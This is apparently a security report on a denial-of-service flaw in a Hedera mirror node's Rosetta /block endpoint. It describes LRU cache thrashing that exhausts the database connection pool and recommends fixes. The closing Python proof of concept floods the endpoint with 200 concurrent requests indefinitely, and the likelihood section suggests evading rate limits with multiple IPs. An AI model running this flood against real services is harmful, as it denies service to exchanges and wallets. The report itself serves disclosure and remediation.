### Title
Unauthenticated LRU Cache Thrashing in `updateOperationAccountAlias()` Enables Database Saturation DoS

### Summary
The Rosetta `/block` endpoint is publicly accessible with no application-level rate limiting. `updateOperationAccountAlias()` uses a shared LRU `entityCache` with no singleflight/request-coalescing protection. An unprivileged attacker can send concurrent `Block()` requests targeting blocks with disjoint account ID sets, continuously evicting cached entries and forcing every cache miss to issue a synchronous `GetAccountAlias()` database query, saturating the finite DB connection pool and denying service to all legitimate users.

### Finding Description

**Exact code path:**

`rosetta/app/services/block_service.go`, `updateOperationAccountAlias()`, lines 104–130:

```go
func (s *blockAPIService) updateOperationAccountAlias(
    ctx context.Context,
    transactions ...*types.Transaction,
) *rTypes.Error {
    for _, transaction := range transactions {
        operations := transaction.Operations
        for index := range operations {
            accountId := operations[index].AccountId
            if cached, found = s.entityCache.Get(accountId.GetId()); !found {
                result, err := s.accountRepo.GetAccountAlias(ctx, accountId)  // DB call on every miss
                ...
                s.entityCache.Set(result.GetId(), result)
            }
        }
    }
    return nil
}
```

The `entityCache` is a single shared LRU instance created at startup with capacity `entityCacheConfig.MaxSize` (default **524,288** per `hiero.mirror.rosetta.cache.entity.maxSize`):

```go
entityCache := cache.NewContext(
    serverContext,
    cache.AsLRU[int64, types.AccountId](lru.WithCapacity(entityCacheConfig.MaxSize)),
)
```

**Root cause and failed assumption:**

1. **No application-level rate limiting.** The Rosetta Go server contains zero rate-limiting or in-flight-request-limiting middleware. The only throttling present is in optional Traefik Kubernetes ingress configuration (`inFlightReq: amount: 5`, `rateLimit: average: 10`), which is infrastructure-level, not enforced by the application, and trivially bypassed by using multiple source IPs.

2. **No singleflight / request coalescing.** Concurrent goroutines handling different requests all read and write the same `entityCache` without any deduplication. When two concurrent requests both miss on the same key, both issue a DB call.

3. **LRU eviction is attacker-controlled.** Because the attacker controls which block (and therefore which account IDs) each request targets, they can deliberately supply a working set larger than 524,288 unique IDs, guaranteeing continuous eviction of entries populated by other concurrent requests.

**Exploit flow:**

- Attacker identifies (or enumerates) blocks on the network that collectively reference more than 524,288 distinct account IDs. On Hedera mainnet with millions of accounts this is straightforward.
- Attacker sends a sustained flood of concurrent `POST /block` requests, cycling through these blocks in a round-robin pattern so each request's account ID set is disjoint from the others currently in the cache.
- Every request suffers 100% cache misses because the LRU continuously evicts entries written by the previous wave of requests.
- Each miss calls `GetAccountAlias()` → `db.Raw(selectCryptoEntityWithAliasById, ...)` synchronously within the request goroutine.
- The DB connection pool (`maxOpenConnections: 100` by default) is exhausted; new requests block waiting for a connection, latency spikes, and the service becomes unavailable to legitimate users.

### Impact Explanation

The database connection pool is the hard resource ceiling. With `maxOpenConnections: 100`, only 100 concurrent `GetAccountAlias()` queries can execute simultaneously. An attacker sustaining more than 100 concurrent cache-missing Block() requests fully saturates the pool. All other Rosetta API operations (network info, account balance, construction) that also require DB access are starved. The result is a complete denial of service for the Rosetta API, which is classified as a non-network-based DoS affecting the mirror node's Rosetta interface — a component used by exchanges and wallets to interact with the Hedera network.

### Likelihood Explanation

The attack requires no credentials, no special knowledge beyond publicly available block indices, and no sophisticated tooling — a simple script issuing concurrent HTTP POST requests suffices. The Traefik-level mitigations (`inFlightReq: 5` per IP, `rateLimit: average: 10` per host) are bypassable with a modest botnet or even a single machine using multiple source IPs via a VPN/proxy. The attack is repeatable indefinitely and requires no state. The 524,288 cache capacity sounds large but is easily exceeded: if each block references ~10,000 unique accounts (realistic for busy mainnet blocks), only ~53 concurrent requests to distinct blocks are needed to exceed the cache capacity and sustain thrashing.

### Recommendation

1. **Add application-level rate limiting and in-flight request limiting** directly in the Rosetta Go HTTP server (e.g., using `golang.org/x/time/rate` or a middleware like `go.uber.org/ratelimit`), independent of any infrastructure layer.
2. **Apply a singleflight pattern** (e.g., `golang.org/x/sync/singleflight`) around the `GetAccountAlias()` call so that concurrent requests for the same account ID share a single DB round-trip rather than each issuing their own.
3. **Cap the number of concurrent Block() requests** at the application level using a semaphore or worker pool, preventing unbounded goroutine/DB-connection growth.
4. **Consider a time-to-live (TTL) on cache entries** in addition to LRU capacity, so that the cache is not purely capacity-bounded and is less susceptible to deliberate eviction attacks.

### Proof of Concept

```python
import concurrent.futures
import requests

ROSETTA_URL = "http://<rosetta-host>:5700"

# Enumerate blocks with disjoint account sets (e.g., sequential block indices)
# Each block on mainnet references hundreds to thousands of unique accounts
block_indices = list(range(1, 10000))  # adjust to real block range

def query_block(index):
    payload = {
        "network_identifier": {"blockchain": "Hedera", "network": "mainnet"},
        "block_identifier": {"index": index}
    }
    try:
        requests.post(f"{ROSETTA_URL}/block", json=payload, timeout=30)
    except Exception:
        pass

# Send 200 concurrent requests cycling through disjoint blocks
# This exceeds the default DB pool (100) and drives continuous LRU eviction
with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
    while True:  # sustain indefinitely
        futures = [executor.submit(query_block, i) for i in block_indices[:200]]
        concurrent.futures.wait(futures)
# Result: DB connection pool exhausted, all Rosetta API calls time out
```